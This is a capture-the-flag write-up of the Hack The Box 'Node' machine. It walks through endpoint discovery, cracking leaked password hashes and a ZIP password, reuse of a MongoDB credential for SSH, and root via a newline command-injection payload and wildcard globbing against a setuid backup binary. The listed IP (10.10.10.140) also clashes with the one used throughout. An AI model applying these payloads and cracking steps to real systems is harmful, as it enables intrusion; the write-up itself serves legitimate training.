## Default Information
IP Address: 10.10.10.140\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.58    node.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.58 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-09 15:35:09 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 3000/tcp on 10.10.10.58                                   
Discovered open port 22/tcp on 10.10.10.58  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | Open |
| 3000	| hadoop-tasktracker | Apache Hadoop | Open |


However from the nmap scan of port 3000, we are able to discover that port 3000 supports HTTP requests. This means that port 3000 is probably accessible via the internet.

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://node.htb:3000

```
http://node.htb:3000/uploads              
http://node.htb:3000/assets               
http://node.htb:3000/vendor               
```


## Exploit
### Source code analysis of static JS files
When we visit http://node.htb:3000, we realize that the JS files are also being loaded at runtime as well. We will then go on to investigate the JS files.

Viewing the loaded files, we realize that we are also able to find the endpoints of the webpage from the JS files. 


From the admin.js file, we are able to find an /api/admin/backup endpoint. This seems to be some sort of backup file that might be downloadable. However, we realize that we are unable to authenticate to the endpoint and we would probably require admin authentication to be able to download the file. 

```
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

In the login.js file, it mainly describes the login logic of the application. From here we can see that if we are able to authenticate successfully, we will be redirected to the /admin endpoint. 

```
var controllers = angular.module('controllers');

controllers.controller('LoginCtrl', function ($scope, $http, $location) {
  $scope.authenticate = function () {
    $scope.hasError = false;

    $http.post('/api/session/authenticate', {
      username: $scope.username,
      password: $scope.password
    }).then(function (res) {
      if (res.data.success) {
        $location.path('/admin');
      }
      else {
        $scope.hasError = true;
        $scope.alertMessage = 'Incorrect credentials were specified';
      }
    }, function (resp) {
      $scope.hasError = true;
      $scope.alertMessage = 'An unexpected error occurred';
    });
  };
});
```

In the home.js file, we are able to find another /api/users/latest endpoint. Visiting this endpoint, we are able to obtain a list of users. However, we realize that all of these users are not admin users.

```
//assets/js/app/controllers/home.js
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

### Attempting to authenticate into the admin portal

From the /api/users/latest endpoint, we realize that the passwords of these users are hashed.
![Viewing latest users](https://github.com/joelczk/writeups/blob/main/HTB/Images/Node/latest_users.png)

Searching up the hashed passwords online, we find that the hashed password of tom decodes to spongebob and the hashed password of mark decodes to snowflake but the hashed password of rastating cannot be decoded.

However, we are unable to continue the exploitation with these users as all of these users are not admin users and we are unable gain access to the control panel. Additionally, we also realize that the credentials are not valid SSH credentials, so we are unable to gain SSH access as well. 

Hence, we would then need to find an admin user to gain access to the admin portal on the site.

### Enumeration of /api and /api/users endpoints
Next, let's us try to enumerate for other endpoints on http://node.htb:3000/api/users using Gobuster. However, we are unable to find any interesting endpoints.

```
http://node.htb:3000/api/users/latest              
http://node.htb:3000/api/users/mark                 
http://node.htb:3000/api/users/tom                  
http://node.htb:3000/api/users/Latest               
```

Lastly, let us try to enumerate for endpoints on http://node.htb:3000/api using Gobuster. From the output, we actually realize that http://node.htb:3000/api/users return a status code of 200. 

```
http://node.htb:3000/api/users                
http://node.htb:3000/api/Users                
http://node.htb:3000/api/session             
http://node.htb:3000/api/Session 
```

Visiting http://node.htb:3000/api/users, we find a similiar list of users that we have obtained previously. However, we are able to find a new user myP14ceAdm1nAcc0uNT that has admin privileges. Looking up the password hash online, we also know that the password for the user is manchester.

### Backup file
Authenticating into the admin portal as myP14ceAdm1nAcc0uNT user, we are able to download a backup file that seems to have a ASCII text file. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ file myplace.backup
myplace.backup: ASCII text, with very long lines, with no line terminators
```

However, viewing the contents of the file, we realize that this is a base64 decoded text. Decoding the base64 decoded text, we realize that this actually belongs to a ZIP file archive.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat myplace.backup | base64 -d > myplace                                                                     1 ⚙
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ file myplace                                                                                                 1 ⚙
myplace: Zip archive data, at least v1.0 to extract
```

### Finding password for ZIP archive

However, we realize that the files in the ZIP file archive are password protected. As such, we will have to crack the password using John the Ripper, and we are able to obtain the password for the file as magicword.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ zip2john myplace > myplace_hash.txt 
┌──(kali㉿kali)-[~/Desktop]
└─$ john myplace_hash.txt --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt                             1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (myplace)     
1g 0:00:00:00 DONE (2021-12-10 10:40) 4.761g/s 897219p/s 897219c/s 897219C/s sandrea..becky21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### SSH as mark

Extracting the files from the ZIP archive file, we are able to obtain a url string ```mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace```. Using the password in the url string, we are able to obtain SSH access to the user mark. 

We also realized that the user flag is in the tom user, but we do not have the privileges to view it.

```
mark@node:/home$ cat frank/user.txt
cat: frank/user.txt: No such file or directory
mark@node:/home$ cat mark/user.txt
cat: mark/user.txt: No such file or directory
mark@node:/home$ cat tom/user.txt
cat: tom/user.txt: Permission denied
```

### Privilege Escalation to Tom

We realize that there are 2 processes running as Tom in the background.

```
mark@node:/tmp$ ps -aux | grep tom
tom       1222  0.0  5.8 1009080 44116 ?       Ssl  Dec09   0:11 /usr/bin/node /var/scheduler/app.js
tom       1229  0.6  7.4 1175236 56404 ?       Ssl  Dec09   9:09 /usr/bin/node /var/www/myplace/app.js
```

Checking /var/www/myplace/app.js, we realize that this is the app.js file that we have examined earlier in the ZIP archive file. We will place our focus on /var/scheduler/app.js instead.

Looking at the /var/scheduler/app.js code, we realize that the mongodb will be executing user-defined command in the task collection. Apart from that, we also realized that the url string specified that the mongodb connection is a localhost. Hence, we would probably need to connect to the mongodb client from our SSH server instead of our local machine. 

```
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```
### Obtaining user flag

After obtaining the reverse shell, all we have to do is to stabilize the reverse shell and we can obtain the user flag.

```
tom@node:/$ cat /home/tom/user.txt
cat /home/tom/user.txt
<Redacted user flag>
```
### Code analysis of binary executable

In the app.js file we have extracted earlier, we are able to see that ```/usr/local/bin/backup -q <backup key> <directory name>``` and the output will be written to a data file when we extract the backup file. 

```
  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });
```

Additionally, we also realized there is no filtering for the ___dirname variable and the executable has root privileges. So we could potentially use the backup binary to obtain the root flag.

```
tom@node:/tmp$ ls -la /usr/local/bin/backup
ls -la /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

Let us first extract the backup binary and reverse the binary to find out what it does. We realize that this binary actually blacklist some of the characters. If any of the following blacklisted characters are found, the binary will output a fake ZIP file that will not contain the flag. Additionally, the pathname that we input would require ```/``` to be inside. 
1. .. 
2. /root
3. :
4. &
5. \
6. $
7. |
8. //
9. /etc

Knowing that we can use wildcards to obtain the base64 encoded string of the password-protected ZIP file containing the root flag.

```
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /roo*/roo*.txt
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /roo*/roo*.txt
UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWeqVs2F1eAsAAQQAAAAABAAAAACUPwWtrzbMHme7L40C3ywR/RFQmDBqrsOYK83J6VdeTnh2u7ACFUdtG6z/ZyFQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/tmp$
```

### Obtaining root flag

Afterwards, all we have to do is to decode the string that we have obtained into a file and use the previously obtained password to view the root.txt file in order to obtain the root flag.

```
echo -n "UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWeqVs2F1eAsAAQQAAAAABAAAAACUPwWtrzbMHme7L40C3ywR/RFQmDBqrsOYK83J6VdeTnh2u7ACFUdtG6z/ZyFQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA" | base64 -d > root
```

## Post-exploitation
From the code analysis of the binary executable, we also realized that ```/usr/bin/zip -r -P magicword <tmp backup file> <Directory of file to backup>``` will be executed using the system() call. 
```
  sprintf(name, "/tmp/.backup_%i", v21);
  sprintf(command, "/usr/bin/zip -r -P magicword %s %s > /dev/null", name, v11);
  system(command);
```

However, we also find out that the tmp backup file name and the directory of the file to backup is not properly sanitized. This would then allow us to carry out command injection attacks. Also even though $ is blacklisted, the command is still being executed as the presence of a blacklisted character only means that the command will output a fake base64 encoded text.

As such if we were to supply the user-defined directory as ```$(printf '\n/bin/bash')```, we are essentially executing the following commands:
```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
/bin/bash
```

Executing the payload will then give us access to the root shell.

```
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf '\n/bin/bash\nls')"
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf '\n/bin/bash\nls')"

zip error: Nothing to do! (/tmp/.backup_2002270091)
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@node:/# id
id
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
root@node:/# 
```
